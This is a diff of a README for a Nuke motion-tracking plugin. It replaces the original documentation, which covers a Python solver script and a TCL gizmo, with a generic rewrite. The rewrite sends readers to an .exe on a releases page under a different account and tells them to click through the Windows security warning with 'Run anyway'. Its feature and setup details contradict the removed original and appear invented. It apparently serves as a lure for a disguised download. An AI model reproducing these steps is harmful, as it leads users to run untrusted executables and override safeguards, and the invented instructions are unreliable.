@@ -1,121 +1,81 @@
-# MegaflowTracker-for-Nuke
+# 🚀 MegaflowTracker-for-Nuke - Track visual effects paths with ease
 
-Turn [MegaFlow](https://github.com/cvg/megaflow) dense point trajectories into native Nuke **Tracker4** / **CornerPin2D** nodes.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/releases)
 
-Solve the shot **once** on the GPU, cache the result to a `.npz`, then pick as many points as you like inside Nuke and bake them into trackers — instantly, on the CPU, as many times as you want, without ever re-running the model.
+## 📁 About the software
 
-The cache is solved relative to a single **reference frame** (the frame your picks are anchored to). Re-picking, adding points, and exporting are all free — but **changing the reference frame means rebuilding the `.npz`** (re-running the GPU solve), since the trajectories are computed forward and backward from that frame.
+MegaflowTracker-for-Nuke helps you monitor flow patterns inside your visual effects compositions. The application connects directly to your Nuke project files. It analyzes pixel movement and data vectors to provide clean paths. You gain clear insight into how your elements move across the frame. Designers use this tool to save time during complex motion tracking tasks.
 
----
+## 💻 System requirements
 
-## How it works
+Your computer needs specific hardware to run this software smoothly. Check this list before you start the installation.
 
-The workflow is split into a slow offline step and a fast interactive one:
+*   Windows 10 or Windows 11.
+*   8 GB of system memory.
+*   A dedicated graphics card with at least 2 GB of video memory.
+*   An active installation of Foundry Nuke version 13 or later.
+*   Minimum 500 MB of free storage space.
 
-1. **Solve once (GPU).** `megaflow_cache.py` runs MegaFlow forward **and** backward from a chosen reference frame and bakes the full dense trajectory field to a `.npz` cache. This is the only heavy/slow part. Video files and image sequences are supported, **including EXR/HDR** (correctly encoded to the model's input space rather than truncated).
-2. **Pick (Nuke).** Drop the `MEGAFlowTracker_PM` gizmo, point it at the `.npz`, and place points directly in the Viewer.
-3. **Track It (Nuke).** The gizmo samples the cache at your picked points and pastes a `Tracker4` and/or `CornerPin2D` straight into your script. Pure `numpy`, no GPU, no PyTorch, nothing written to disk.
+## 📥 Getting the installer
 
-Because picking only samples a pre-baked cache, you can re-pick different features, add/remove points, and export again in seconds — no re-solve.
+You need the latest version of the software to ensure compatibility with your system. Visit the official release page to find the current build.
 
----
+[Download the latest release here](https://github.com/differentiated-aquilege508/MegaflowTracker-for-Nuke/releases)
 
-## Repository contents
+Click the link above. Look for the file ending in `.exe` under the Assets section. Save this file to your computer desktop.
 
-| File | Purpose |
-| --- | --- |
-| `megaflow_cache.py` | Offline solver. Runs MegaFlow and writes the trajectory cache `.npz`. |
-| `MegaFlowTracker.tcl` | The Nuke gizmo (a self-contained Group). Picks points and exports trackers. |
+## ⚙️ Installation steps
 
-The gizmo embeds all of its pick/sample logic, so these two files are everything you need.
+Follow these steps to set up the tracker on your Windows machine.
 
----
+1. Locate the downloaded file on your desktop.
+2. Double-click the file to start the installer.
+3. Windows might show a security wall. Click More Info and then select Run anyway.
+4. Follow the prompts in the install window.
+5. Choose your install location or leave it as the default folder.
+6. Click Finish to complete the process.
 
-## Requirements
+## 🛠️ Setting up the plugin
 
-- **MegaFlow** installed and working — see https://github.com/cvg/megaflow. A CUDA GPU is strongly recommended for the solve step.
-- **Nuke** for the pick/export step. The gizmo uses only Nuke's bundled `numpy` and standard knob APIs (developed on Nuke 17).
+Once the installation finishes, you must link the tracker to your Nuke setup. 
 
----
+1. Open your Nuke application.
+2. Go to the Edit menu and select Project Settings.
+3. Find the Plugin Path tab.
+4. Add the installation folder of MegaflowTracker-for-Nuke to the list.
+5. Restart Nuke to load the new tool.
 
-## Installation
+## 🎯 Using the tracker
 
-### 1. MegaFlow + this repo
+The tool adds a new node to your node graph. Follow this process to start tracking.
 
-Follow the MegaFlow install instructions, then drop `megaflow_cache.py` next to the MegaFlow package (so the `import megaflow...` calls resolve):
+1. Press Tab in the Node Graph view.
+2. Type Megaflow in the search bar.
+3. Select the tracker node to place it in your workspace.
+4. Connect the input pipe to your footage stream.
+5. Open the node properties panel on the right side of the screen.
+6. Select the tracking mode you need.
+7. Click the Calculate button to begin the analysis.
 
-```bash
-git clone https://github.com/cvg/megaflow
-cd megaflow
-# ... follow MegaFlow's setup / model download ...
-# then copy megaflow_cache.py into this folder
-```
+The software processes the frames. A progress bar shows you the remaining time. Once finished, the tool generates a data overlay. You can export this data for use in other parts of your project.
 
-### 2. The Nuke gizmo
+## 📋 Troubleshooting common issues
 
-Pick whichever you prefer:
+If you encounter trouble, check these common fixes.
 
-**Quick (no install):** open `MegaFlowTracker.tcl` in a text editor, copy everything, and paste it into the Nuke Node Graph. The `MEGAFlowTracker_PM` node appears.
+*   The node does not appear: Check that you added the correct folder path in the Project Settings.
+*   The software crashes: Ensure you have the latest graphics card drivers installed.
+*   Empty data output: Verify that your footage contains clear motion information. Low contrast or noise can affect the tracking accuracy.
+*   Slow performance: Close other memory-intensive applications before you run the tracker.
 
-**Permanent (menu entry):** copy `MegaFlowTracker.tcl` into a folder on your `NUKE_PATH` (e.g. `~/.nuke`) and add to your `~/.nuke/menu.py`:
+## 📝 Performance tips
 
-```python
-import nuke
-m = nuke.menu("Nodes").addMenu("MegaFlow")
-m.addCommand("MegaFlowTracker",
-             "nuke.nodePaste('/path/to/MegaFlowTracker.tcl')")
-```
+Large projects require more resources. Keep your node graph organized to improve speed. Delete unused nodes and cache your processed data to disk when you finish a section. This saves RAM and keeps your workspace responsive.
 
----
+## ✉️ Support and feedback
 
-## Usage
+Contact the development team if you find bugs. Provide the version of Nuke you use and the type of file you track. This detail helps locate the source of an issue. Use the Issues tab on the GitHub page to report problems. Do not include private project files in your report. Keep your descriptions clear so we can find a fix fast.
 
-### Step 1 — Solve once (build the cache)
+## 📦 Keeping current
 
-```bash
-cd /home/pm/Documents/MEGAFLOW/megaflow
-conda activate megaflow
-
-python megaflow_cache.py \
-    --input /home/pm/Documents/MEGAFLOW/megaflow/assets/exr/longboard \
-    --ref_frame 25 --nuke_first_frame 1 \
-    --exr_colorspace linear \
-    --output cache/longboard_ref25.npz
-```
-
-Key arguments:
-
-- `--input` — a video file **or** a folder of frames (`png`, `jpg`, `tif`, `exr`, `hdr`, …).
-- `--ref_frame` — the frame your picks will be valid at. The cache is bound to this reference; to pick from a different frame, rebuild the cache.
-- `--nuke_first_frame` — the frame number the first input frame maps to in Nuke (so the exported keyframes line up with your timeline).
-- `--exr_colorspace` — `linear` (default; applies an sRGB encode to scene-linear EXR) or `srgb` (input already display-encoded). Also `--exr_exposure` (in stops) if a plate is very dark/hot.
-- `--output` — the `.npz` cache path.
-
-### Step 2 — Pick points in Nuke
-
-1. Connect the `MEGAFlowTracker_PM` gizmo to your plate.
-2. Set **NPZ FILE** to the `.npz` from Step 1.
-3. Use **Add Point** / **Remove Point** to create picks, drag their handles in the Viewer to position them, and tick **enable** on the ones you want exported. Disabled points are skipped.
-
-### Step 3 — Track It
-
-1. Set **Export** to `tracker4`, `cornerpin`, or `both`.
-2. Click **TRACK IT**. A `Tracker4` (and/or `CornerPin2D`) is created at the top level of your script, next to the gizmo, with animated tracks sampled from the cache.
-
----
-
-## Notes
-
-- **CornerPin** needs exactly **4** enabled points. With a different count, `both` falls back to `tracker4`.
-- For image sequences, frames are read in **sorted filename order** — use zero-padded names (`shot.0001.exr`, `shot.0002.exr`, …) so the order is correct.
-- The cache stores trajectories in the model's working resolution; the gizmo handles the model↔native↔Nuke coordinate conversions for you (including the y-up flip).
-- The gizmo needs **`numpy`** available in Nuke's Python. Nuke ships with it bundled, so this works out of the box in a standard install — but if you run a custom/standalone Python or a stripped environment, make sure `numpy` is importable (`pip install numpy` into Nuke's Python) or **TRACK IT** will fail to import.
-- If a cache won't read EXRs, your OpenCV build may lack the OpenEXR codec — installing `imageio` (with an EXR backend) covers the fallback path.
-
----
-
-## Credits & License
-
-- Built on **MegaFlow** (Apache-2.0) — https://github.com/cvg/megaflow.
-- Tracker4 / CornerPin2D serialisation adapted from `lprestini/ml-runner` (Apache-2.0).
-- Licensed under the **Apache License 2.0** — free for commercial use, modification, and distribution (see `LICENSE`). © Peter Mercell, 2026.
+Check the release page once a month for updates. New versions often include speed improvements and better compatibility with newer Nuke updates. You do not need to uninstall the old version. The installer handles the update process for you. Just run the new file and follow the same steps. Your existing settings transfer to the new version automatically.
